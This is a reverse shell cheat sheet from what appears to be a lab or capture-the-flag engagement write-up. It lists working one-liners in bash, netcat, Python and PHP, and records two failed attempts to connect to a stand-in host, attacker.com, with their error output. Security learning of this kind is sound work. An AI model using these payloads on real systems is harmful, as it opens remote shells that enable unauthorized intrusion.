# Reverse Shells Cheat Sheet

## Overview

A reverse shell is a technique where a target machine initiates an outbound connection back to an attacker-controlled listener, granting interactive command execution. A bash-native reverse shell attempt was made during this engagement's privilege escalation phase (see [07-Privilege-Escalation](../docs/07-Privilege-Escalation/README.md)), though it did not succeed due to outbound network restrictions in the lab environment.

## Common Syntax

```bash
bash -c 'exec bash -i &>/dev/tcp/<attacker-ip>/<port> <&1'
```

## Useful Commands

| Payload | Language |
|---|---|
| `bash -c 'exec bash -i &>/dev/tcp/<ip>/<port> <&1'` | Bash (`/dev/tcp` pseudo-device) |
| `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | Bash (alternate syntax) |
| `nc -e /bin/sh <ip> <port>` | Netcat (if `-e` supported by the build) |
| `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ip>",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'` | Python 3 |
| `php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` | PHP |

## Important Options

| Concept | Description |
|---|---|
| `/dev/tcp/<ip>/<port>` | A bash built-in pseudo-device that opens a TCP socket without needing external tools like `nc` |
| Listener | A `nc -lvnp <port>` process on the attacker machine that receives the incoming connection |
| Outbound filtering | Many hardened or lab networks block outbound connections on arbitrary ports, causing reverse shells to hang/time out |

## Examples

Attempt made in this engagement as user `james` under the `(ALL, !root) /bin/bash` sudo rule:

```bash
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
```

```text
bash: connect: Connection timed out
bash: /dev/tcp/attacker.com/12345: Connection timed out
```

```bash
sudo bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
```

```text
Sorry, user james is not allowed to execute '/bin/bash -c exec bash -i &>/dev/tcp/attacker.com/12345 <&1' as root on agent-sudo.
```

> [!NOTE]
> Both attempts were unsuccessful — the first due to outbound network filtering (connection timed out) and the second because the sudoers `!root` restriction correctly blocked running the command explicitly as root. This ultimately led to using the CVE-2019-14287 numeric-UID bypass instead (see [07-Privilege-Escalation](../docs/07-Privilege-Escalation/README.md)).

## Common Mistakes

- Assuming a reverse shell payload is broken when the real issue is outbound network/firewall filtering on the target.
- Using a hostname (`attacker.com`) instead of a raw IP address when DNS resolution may not be reliable from the target's network context.
- Forgetting to start the listener (`nc -lvnp <port>`) on the attacker machine **before** triggering the payload on the target.

## References

- [PayloadsAllTheThings — Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Bash `/dev/tcp` Documentation](https://tldp.org/LDP/abs/html/devref1.html)

## Key Takeaways

- A reverse shell timing out is not necessarily a syntax error — always rule out network-level filtering first.
- When a reverse shell path is blocked (by network or sudoers restrictions), a local privilege escalation technique (like CVE-2019-14287) can achieve the same end goal without needing outbound connectivity at all.
